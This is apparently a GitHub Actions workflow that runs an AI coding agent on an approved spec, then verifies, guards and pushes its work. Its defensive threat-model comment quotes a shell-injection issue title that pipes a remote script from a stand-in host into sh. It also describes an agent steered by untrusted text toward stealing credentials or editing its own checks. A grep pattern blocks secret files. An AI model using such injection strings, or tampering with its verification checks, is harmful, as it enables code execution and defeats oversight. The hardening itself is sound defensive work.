name: Reusable Agent Executor

# Threat model for this file, in one place:
#
#   * Every value that originates outside this repo (issue titles, comment
#     bodies, branch names) reaches the shell through `env:` and is read as
#     "$VAR". None of it is interpolated into a `run:` body, because an issue
#     titled `x'; curl evil.sh | sh; #` would otherwise execute.
#   * The step that runs `claude` never holds a GitHub credential. The agent
#     has unrestricted Bash, so a GH_TOKEN sitting in its environment is a
#     write-capable credential handed to a process steered by untrusted text.
#     The checkout below therefore also sets persist-credentials: false --
#     otherwise actions/checkout leaves a usable token in .git/config, which
#     the agent can simply read.
#   * The GitHub App token is minted *after* the agent has finished, so it does
#     not exist on the runner while the agent is running.
#   * Nothing is pushed until ./scripts/verify.sh has passed.

on:
  workflow_call:
    inputs:
      issue_number:
        required: true
        type: string
      issue_title:
        required: true
        type: string
      verify_command:
        description: >-
          Path to the caller repo's verification script. Deliberately a path and
          not a shell string: passing shell through a workflow input is the same
          class of hole this file exists to close, and a script versions the gate
          alongside the code it checks.
        required: false
        type: string
        default: ./scripts/verify.sh
      setup_python:
        required: false
        type: boolean
        default: false
      setup_node:
        required: false
        type: boolean
        default: false
      setup_uv:
        required: false
        type: boolean
        default: false
      max_attempts:
        description: Verification attempts, including the first, before giving up.
        required: false
        type: number
        default: 3
    secrets:
      ANTHROPIC_API_KEY:
        required: true
      APP_ID:
        required: true
      APP_PRIVATE_KEY:
        required: true

jobs:
  execute:
    runs-on: ubuntu-latest

    # Re-asserted here and not only in the caller. ai-workflows has
    # access_level: user, so all repos under this account may call this
    # workflow; a gate that lives in one caller is not a gate.
    if: >-
      github.event_name == 'workflow_dispatch'
      || github.event.comment.author_association == 'OWNER'

    # Two `@agent execute` comments on one issue would otherwise race on the
    # same branch. Queue rather than cancel: a cancelled run can leave a
    # half-written tree behind.
    concurrency:
      group: agent-executor-${{ github.repository }}-${{ inputs.issue_number }}
      cancel-in-progress: false

    permissions:
      contents: write
      pull-requests: write
      issues: write

    steps:
      - name: Checkout
        uses: actions/checkout@v7
        with:
          fetch-depth: 0
          # See the header: leaving credentials in .git/config would hand the
          # agent the very token this workflow keeps away from it.
          persist-credentials: false

      - name: Set up Python
        if: inputs.setup_python
        uses: actions/setup-python@v7
        with:
          python-version: '3.13'

      - name: Install uv
        if: inputs.setup_uv
        uses: astral-sh/setup-uv@v7

      - name: Set up Node.js
        if: inputs.setup_node
        uses: actions/setup-node@v7
        with:
          node-version: '20'

      - name: Cache Claude binary
        id: cache-claude
        uses: actions/cache@v6
        with:
          path: ~/.local/bin/claude
          key: ${{ runner.os }}-claude-binary

      - name: Install Claude Code
        run: |
          set -euo pipefail
          if [ ! -f "$HOME/.local/bin/claude" ]; then
            curl -fsSL https://claude.ai/install.sh | bash
          fi
          echo "$HOME/.local/bin" >> "$GITHUB_PATH"

      - name: Locate the approved spec
        id: spec
        env:
          ISSUE_NUMBER: ${{ inputs.issue_number }}
        run: |
          # Deliberately no -e: a missing spec is reported, not crashed on.
          set -uo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

          # Match on the issue number, not the slug: editing an issue title
          # changes the slug, and that must not orphan the work.
          MATCHES=$(git branch -r --list "origin/agent/${ISSUE_NUMBER}-*" \
                    | sed 's|.*origin/||' | tr -d ' ' | grep . || true)
          COUNT=$(printf '%s\n' "$MATCHES" | grep -c . || true)
          if [ "$COUNT" -eq 0 ]; then
            echo "reason=No spec branch \`agent/${ISSUE_NUMBER}-*\` exists. Open the issue and let the planner write a spec first, then approve it." >> "$GITHUB_OUTPUT"
            echo "found=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          if [ "$COUNT" -gt 1 ]; then
            echo "reason=Ambiguous: $COUNT branches match \`agent/${ISSUE_NUMBER}-*\`. Delete the stale ones and retry." >> "$GITHUB_OUTPUT"
            echo "found=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          BRANCH="$MATCHES"
          git checkout -q -B "$BRANCH" "origin/$BRANCH" || {
            echo "reason=Could not check out \`$BRANCH\`." >> "$GITHUB_OUTPUT"
            echo "found=false" >> "$GITHUB_OUTPUT"
            exit 0
          }

          SPECS=$(ls -1 "docs/specs/${ISSUE_NUMBER}-"*.md 2>/dev/null | grep . || true)
          SCOUNT=$(printf '%s\n' "$SPECS" | grep -c . || true)
          if [ "$SCOUNT" -ne 1 ]; then
            echo "reason=Expected exactly one \`docs/specs/${ISSUE_NUMBER}-*.md\` on \`$BRANCH\`, found $SCOUNT." >> "$GITHUB_OUTPUT"
            echo "found=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          echo "Spec branch: $BRANCH"
          echo "Spec file:   $SPECS"
          echo "found=true" >> "$GITHUB_OUTPUT"
          {
            echo "AGENT_BRANCH=$BRANCH"
            echo "SPEC_PATH=$SPECS"
            echo "BASE_SHA=$(git rev-parse HEAD)"
          } >> "$GITHUB_ENV"

      # Exits non-zero, which skips every later step: no agent runs, no PR.
      - name: Fail closed when there is no single approved spec
        if: steps.spec.outputs.found != 'true'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
          REASON: ${{ steps.spec.outputs.reason }}
        run: |
          set -euo pipefail
          gh issue comment "$ISSUE_NUMBER" \
            --body "**Agent executor: blocked.** ${REASON}"
          gh issue edit "$ISSUE_NUMBER" --add-label "agent:blocked" \
            || echo "::warning::could not apply the agent:blocked label"
          echo "::error::${REASON}"
          exit 1

      - name: Mark the issue as building
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
        run: |
          set -euo pipefail
          gh issue edit "$ISSUE_NUMBER" \
            --add-label "agent:build" --remove-label "agent:spec" \
            || echo "::warning::could not update labels"

      - name: Agent execution
        env:
          ISSUE_NUMBER: ${{ inputs.issue_number }}
          ISSUE_TITLE: ${{ inputs.issue_title }}
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          CLAUDE_CODE_NO_FLICKER: 1
          # No GH_TOKEN here, deliberately. See the header.
        run: |
          set -euo pipefail
          PROMPT="Implement the approved spec for issue #${ISSUE_NUMBER}, titled: ${ISSUE_TITLE}."
          PROMPT="$PROMPT The spec is the file ${SPEC_PATH} - read it first and treat it as the definition of done."
          PROMPT="$PROMPT Implement every acceptance criterion in it, and add tests that demonstrate each one."
          PROMPT="$PROMPT Implement nothing the spec does not call for; if you believe something extra is needed, note it in the spec's Scope section instead of building it."
          PROMPT="$PROMPT Do not modify .github/ or the verification script."
          claude --bare -p "$PROMPT" --allowedTools "Bash,Edit,Read"

      - name: Verify and repair
        id: verify
        env:
          VERIFY_CMD: ${{ inputs.verify_command }}
          MAX_ATTEMPTS: ${{ inputs.max_attempts }}
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          CLAUDE_CODE_NO_FLICKER: 1
        run: |
          # No -e: failures of the verify command are the thing being handled.
          set -uo pipefail
          if [ ! -x "$VERIFY_CMD" ]; then
            echo "::error::$VERIFY_CMD missing or not executable - refusing to open an unverified PR."
            exit 1
          fi
          attempt=1
          while :; do
            echo "::group::verify attempt $attempt"
            if out=$("$VERIFY_CMD" 2>&1); then
              echo "$out"
              echo "::endgroup::"
              echo "ok=true" >> "$GITHUB_OUTPUT"
              exit 0
            fi
            echo "$out"
            echo "::endgroup::"
            if [ "$attempt" -ge "$MAX_ATTEMPTS" ]; then
              echo "ok=false" >> "$GITHUB_OUTPUT"
              printf '%s\n' "$out" | tail -c 4000 > "$RUNNER_TEMP/verify-tail.log"
              exit 0
            fi
            printf '%s' "$out" | tail -c 8000 > /tmp/verify.log
            claude --bare -p "The verification command '$VERIFY_CMD' failed. Read /tmp/verify.log and fix the code so it passes. Do not modify $VERIFY_CMD, .github/, or any test in order to make it pass." \
              --allowedTools "Bash,Edit,Read"
            attempt=$((attempt+1))
          done

      # Enforced, not merely requested of the agent. An agent under repair
      # pressure treats "make the check pass" as the goal, and editing the check
      # is the shortest path there. .entire/ is gitignored, so `git add -A` will
      # not stage it -- this is the backstop against `git add -f`.
      - name: Guard protected paths
        if: steps.verify.outputs.ok == 'true'
        run: |
          set -euo pipefail
          git add -A
          BAD=$(git diff --cached --name-only "$BASE_SHA" \
                | grep -E '(^|/)\.entire/|(^|/)\.env$|\.pem$|id_rsa|^\.github/|^scripts/verify\.sh$' || true)
          if [ -n "$BAD" ]; then
            echo "::error::Refusing to commit protected path(s):"
            printf '%s\n' "$BAD"
            git reset
            exit 1
          fi
          if git diff --cached --quiet "$BASE_SHA"; then
            echo "HAS_CHANGES=false" >> "$GITHUB_ENV"
          else
            echo "HAS_CHANGES=true" >> "$GITHUB_ENV"
          fi

      # Minted only now, so the token does not exist on the runner while the
      # agent is running. It is also required rather than cosmetic: a PR opened
      # with GITHUB_TOKEN does not trigger `pull_request` workflows, so required
      # status checks would never report and the PR could never be merged.
      - name: Mint app token
        if: steps.verify.outputs.ok == 'true' && env.HAS_CHANGES == 'true'
        id: app-token
        uses: actions/create-github-app-token@v3
        with:
          app-id: ${{ secrets.APP_ID }}
          private-key: ${{ secrets.APP_PRIVATE_KEY }}

      - name: Commit, push and open PR
        if: steps.verify.outputs.ok == 'true' && env.HAS_CHANGES == 'true'
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
          ISSUE_TITLE: ${{ inputs.issue_title }}
          VERIFY_CMD: ${{ inputs.verify_command }}
          REPO: ${{ github.repository }}
          BASE_BRANCH: ${{ github.event.repository.default_branch }}
        run: |
          set -euo pipefail
          git commit -q -m "feat: implement issue #${ISSUE_NUMBER}"
          git push "https://x-access-token:${GH_TOKEN}@github.com/${REPO}.git" \
            "HEAD:refs/heads/${AGENT_BRANCH}"

          # The planner already opened this PR against the spec. The executor
          # pushes onto the same branch, so one PR grows spec -> spec + code and
          # a reviewer sees both halves in a single diff.
          PR_URL=$(gh pr view "$AGENT_BRANCH" --json url --jq .url 2>/dev/null || true)
          if [ -z "$PR_URL" ]; then
            {
              printf 'Implements #%s (%s), per `%s`.\n\n' \
                "$ISSUE_NUMBER" "$ISSUE_TITLE" "$SPEC_PATH"
              printf 'Pushed by the agent executor after `%s` passed. That gate is a\n' "$VERIFY_CMD"
              printf 'pre-filter, not the merge gate: required status checks remain authoritative.\n'
            } > "$RUNNER_TEMP/pr-body.md"
            PR_URL=$(gh pr create \
              --title "feat: implement issue #${ISSUE_NUMBER}" \
              --body-file "$RUNNER_TEMP/pr-body.md" \
              --base "$BASE_BRANCH" \
              --head "$AGENT_BRANCH")
          fi
          gh pr comment "$PR_URL" \
            --body "**Agent executor:** \`${VERIFY_CMD}\` passed and the implementation is pushed. This PR now contains both the spec and the code implementing it."
          gh issue comment "$ISSUE_NUMBER" \
            --body "**Agent executor:** verification passed and the implementation is up at $PR_URL"
          gh issue edit "$ISSUE_NUMBER" \
            --add-label "agent:review" --remove-label "agent:build" \
            || echo "::warning::could not update labels"

      - name: Report no changes
        if: steps.verify.outputs.ok == 'true' && env.HAS_CHANGES != 'true'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
        run: |
          set -euo pipefail
          gh issue comment "$ISSUE_NUMBER" \
            --body "**Agent executor:** the agent made no changes, so there is nothing to open a PR for."

      - name: Report verification failure
        if: steps.verify.outputs.ok == 'false'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
          VERIFY_CMD: ${{ inputs.verify_command }}
          MAX_ATTEMPTS: ${{ inputs.max_attempts }}
        run: |
          set -euo pipefail
          {
            echo "**Agent executor: blocked.** \`${VERIFY_CMD}\` still failed after ${MAX_ATTEMPTS} attempts, so no PR was opened."
            echo
            echo "<details><summary>Last failure output</summary>"
            echo
            echo '```'
            cat "$RUNNER_TEMP/verify-tail.log"
            echo '```'
            echo
            echo "</details>"
          } > "$RUNNER_TEMP/blocked.md"
          gh issue comment "$ISSUE_NUMBER" --body-file "$RUNNER_TEMP/blocked.md"
          gh issue edit "$ISSUE_NUMBER" --add-label "agent:blocked" \
            || echo "::warning::could not apply agent:blocked label"
          exit 1
